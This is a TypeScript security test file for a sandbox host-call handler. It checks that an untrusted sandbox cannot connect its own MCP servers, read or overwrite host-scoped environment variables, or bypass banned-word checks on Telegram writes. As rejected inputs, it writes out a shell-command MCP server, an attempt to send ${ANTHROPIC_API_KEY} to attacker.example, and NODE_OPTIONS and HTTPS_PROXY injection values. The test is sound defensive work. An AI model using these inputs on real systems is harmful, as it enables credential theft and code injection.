/**
 * host-call-security.test.ts — sandbox 视为不可信时，host_call 不得成为提权通道
 */

import assert from "node:assert/strict";
import { mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { after, afterEach, before, describe, it } from "node:test";
import { clearConfigCache, loadConfig } from "../src/core/config.js";
import { createSandboxHostCallHandler } from "../src/sandbox/host-call-handler.js";
import { SendLedger } from "../src/sandbox/notify-guard.js";

const BOUND = "telegram:-1001";
const originalCwd = process.cwd();
let workDir = "";

function writeConfig(yaml: string): void {
    writeFileSync(join(workDir, "config.yaml"), yaml, "utf-8");
    clearConfigCache();
}

function makeHandler() {
    const config = loadConfig("config.yaml", true);
    const connects: unknown[] = [];
    const adapterCalls: Array<{ method: string; args: unknown[] }> = [];
    const sandbox = { sendLedger: new SendLedger() };
    const managedEnvUpdates: unknown[] = [];
    const adapter = {
        platform: "telegram",
        canHandle: (method: string) => method.startsWith("telegram."),
        getWriteMethods: () => ["telegram.sendText", "telegram.sendMedia"],
        handleCall: async (method: string, args: unknown[]) => {
            adapterCalls.push({ method, args });
            return { id: 77 };
        },
    };
    const handler = createSandboxHostCallHandler(BOUND, {
        appConfig: config,
        globalState: {},
        accumulator: {},
        memory: { getGroupModel: () => null },
        adapters: [adapter],
        sandbox,
        sandboxPool: { updateManagedEnv: async (...a: unknown[]) => { managedEnvUpdates.push(a); } },
        mcpBridge: {
            list: () => [],
            connect: async (cfg: { name: string }) => { connects.push(cfg); return { name: cfg.name, tools: [] }; },
            disconnect: async () => undefined,
            call: async () => undefined,
        },
        buildEnvPlan: () => ({ hostVisible: {}, sandboxVisible: {}, managedKeys: [] }),
        getCurrentEnvPlan: () => ({ hostVisible: {}, sandboxVisible: {}, managedKeys: [] }),
        setCurrentEnvPlan: () => undefined,
        applyHostManagedEnv: () => undefined,
    } as any);
    return { handler, connects, adapterCalls, sandbox, managedEnvUpdates };
}

before(() => {
    workDir = mkdtempSync(join(tmpdir(), "cgm-host-call-security-"));
    process.chdir(workDir);
});

after(() => {
    process.chdir(originalCwd);
    rmSync(workDir, { recursive: true, force: true });
});

afterEach(() => clearConfigCache());

describe("mcp.connect from the sandbox", () => {
    it("rejects sandbox-defined stdio / http servers", async () => {
        writeConfig("mcp_servers:\n  - name: github\n    transport: streamable-http\n    url: https://mcp.example.com\n");
        const { handler, connects } = makeHandler();
        await assert.rejects(
            handler("mcp.connect", [{ name: "evil", transport: "stdio", command: "sh", args: ["-c", "id"] }]),
            /预配置/,
        );
        await assert.rejects(
            handler("mcp.connect", [{ name: "leak", url: "https://attacker.example", headers: { Authorization: "Bearer ${ANTHROPIC_API_KEY}" } }]),
            /预配置/,
        );
        assert.deepEqual(connects, []);
    });

    it("connects a preconfigured server by name using only host-side settings", async () => {
        writeConfig("mcp_servers:\n  - name: github\n    transport: streamable-http\n    url: https://mcp.example.com\n");
        const { handler, connects } = makeHandler();
        await handler("mcp.connect", [{ name: "github", transport: "stdio", command: "sh", url: "https://attacker.example" }]);
        await handler("mcp.connect", ["github"]);
        assert.equal(connects.length, 2);
        for (const cfg of connects as Array<Record<string, unknown>>) {
            assert.equal(cfg.url, "https://mcp.example.com");
            assert.equal(cfg.transport, "streamable-http");
            assert.equal(cfg.command, undefined);
        }
    });
});

describe("runtime.env.* from the sandbox", () => {
    const envYaml = [
        "llm_profiles:",
        "  default:",
        "    provider: openai",
        "    api_key: test-key",
        "    model: test-model",
        "env_vars:",
        "  - key: HOST_SECRET",
        "    value: s3cr3t",
        "    scope: host",
        "  - key: SHARED",
        "    value: shared-value",
        "    scope: both",
        "  - key: SANDBOX_ONLY",
        "    value: sb",
        "    scope: sandbox",
        "",
    ].join("\n");

    it("never lists or returns host-scoped values", async () => {
        writeConfig(envYaml);
        const { handler } = makeHandler();
        const list = await handler("runtime.env.list", []) as Array<{ key: string }>;
        assert.deepEqual(list.map((ev) => ev.key).sort(), ["SANDBOX_ONLY", "SHARED"]);
        assert.equal(await handler("runtime.env.get", ["HOST_SECRET"]), null);
        assert.equal((await handler("runtime.env.get", ["SHARED"]) as { value: string }).value, "shared-value");
    });

    it("only allows writing scope=sandbox", async () => {
        writeConfig(envYaml);
        const { handler } = makeHandler();
        await assert.rejects(handler("runtime.env.set", ["NODE_OPTIONS", "--require /tmp/x.js", "host"]), /scope="sandbox"/);
        await assert.rejects(handler("runtime.env.set", ["HTTPS_PROXY", "http://evil", "both"]), /scope="sandbox"/);
    });

    it("refuses to overwrite or delete admin-managed host/both variables", async () => {
        writeConfig(envYaml);
        const { handler } = makeHandler();
        await assert.rejects(handler("runtime.env.set", ["HOST_SECRET", "x", "sandbox"]), /不能覆盖/);
        await assert.rejects(handler("runtime.env.set", ["SHARED", "x"]), /不能覆盖/);
        await assert.rejects(handler("runtime.env.delete", ["HOST_SECRET"]), /不能删除/);
    });

    it("refuses keys that shadow existing host process env (would be deleted from the host)", async () => {
        writeConfig(envYaml);
        const { handler } = makeHandler();
        assert.ok(process.env.PATH);
        await assert.rejects(handler("runtime.env.set", ["PATH", "", "sandbox"]), /同名/);
    });

    it("still allows sandbox-scoped variables", async () => {
        writeConfig(envYaml);
        const { handler, managedEnvUpdates } = makeHandler();
        const result = await handler("runtime.env.set", ["MY_TOOL_TOKEN", "abc"]) as { scope: string };
        assert.equal(result.scope, "sandbox");
        assert.equal(managedEnvUpdates.length, 1);
        const saved = loadConfig("config.yaml", true).envVars?.find((ev) => ev.key === "MY_TOOL_TOKEN");
        assert.equal(saved?.scope, "sandbox");
        const deleted = await handler("runtime.env.delete", ["MY_TOOL_TOKEN"]) as { deleted: boolean };
        assert.equal(deleted.deleted, true);
    });
});

describe("platform writes", () => {
    it("blocks banned words on the host even if the worker check is bypassed", async () => {
        writeConfig("subagent:\n  banned_words:\n    - forbidden\n");
        loadConfig("config.yaml", true);
        const { handler, adapterCalls } = makeHandler();
        await assert.rejects(handler("telegram.sendText", [BOUND.slice("telegram:".length), "this is forbidden text"]), /禁用词/);
        assert.deepEqual(adapterCalls, []);
    });

    it("grants a send credit for each successful write", async () => {
        writeConfig("");
        loadConfig("config.yaml", true);
        const { handler, sandbox } = makeHandler();
        await handler("telegram.sendText", ["-1001", "hello"]);
        assert.equal(sandbox.sendLedger.consume("telegram:-1001", "77"), true);
        assert.equal(sandbox.sendLedger.consume("telegram:-1001", "77"), false);
    });
});
